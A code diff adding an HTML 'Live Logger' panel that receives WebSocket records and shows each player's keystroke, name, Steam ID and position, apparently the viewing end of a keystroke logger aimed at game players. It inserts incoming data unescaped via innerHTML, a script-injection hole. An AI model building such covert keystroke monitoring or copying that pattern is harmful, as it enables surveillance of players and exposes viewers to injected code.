@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Logger Panel</title>
+    <style>
+        body {
+            background: #0f172a;
+            color: white;
+            font-family: Arial;
+        }
+        .log {
+            background: #1e293b;
+            margin: 10px;
+            padding: 10px;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body>
+
+<h1>🛡️ Live Logger</h1>
+<div id="logs"></div>
+
+<script>
+const ws = new WebSocket(`wss://${location.host}`);
+
+ws.onmessage = (event) => {
+    const data = JSON.parse(event.data);
+
+    const div = document.createElement("div");
+    div.className = "log";
+
+    div.innerHTML = `
+        ⌨️ ${data.key || "?"}<br>
+        👤 ${data.player || "?"}<br>
+        🆔 ${data.steamid || "?"}<br>
+        📍 ${data.position || "?"}
+    `;
+
+    document.getElementById("logs").prepend(div);
+};
+</script>
+
+</body>
+</html>
